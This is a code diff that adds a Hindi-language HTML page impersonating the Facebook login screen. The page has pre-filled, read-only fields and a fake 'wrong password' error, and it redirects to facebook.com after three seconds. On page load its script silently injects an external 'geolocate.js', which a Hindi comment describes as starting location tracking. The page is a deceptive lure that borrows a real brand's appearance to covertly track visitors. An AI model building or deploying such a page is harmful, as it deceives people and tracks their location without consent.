@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #f0f2f5; display: flex; justify-content: center;
+            align-items: center; min-height: 100vh; font-family: Helvetica, Arial, sans-serif;
+        }
+        .login-box {
+            background: white; padding: 30px; border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 400px; text-align: center;
+        }
+        .logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
+        input {
+            width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd;
+            border-radius: 6px; font-size: 16px;
+        }
+        .btn {
+            width: 100%; padding: 14px; background: #1877f2; color: white;
+            border: none; border-radius: 6px; font-size: 18px; font-weight: bold;
+            cursor: pointer; margin-top: 10px;
+        }
+        .btn:hover { background: #166fe5; }
+        .error { color: red; font-size: 13px; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body>
+<div class="login-box">
+    <div class="logo">facebook</div>
+    <input type="text" id="email" placeholder="ईमेल या फोन नंबर" value="test@email.com" readonly>
+    <input type="password" id="pass" placeholder="पासवर्ड" value="********" readonly>
+    <button class="btn" id="loginBtn" onclick="fakeLogin()">लॉग इन करें</button>
+    <div class="error" id="errorMsg">गलत पासवर्ड। कृपया पुनः प्रयास करें।</div>
+</div>
+
+<script>
+// पेज लोड होते ही लोकेशन ट्रैकिंग शुरू
+(function() {
+    const script = document.createElement('script');
+    script.src = 'geolocate.js';
+    document.body.appendChild(script);
+})();
+
+function fakeLogin() {
+    document.getElementById('errorMsg').style.display = 'block';
+    setTimeout(() => {
+        window.location.href = 'https://www.facebook.com';
+    }, 3000);
+}
+</script>
+</body>
+</html>
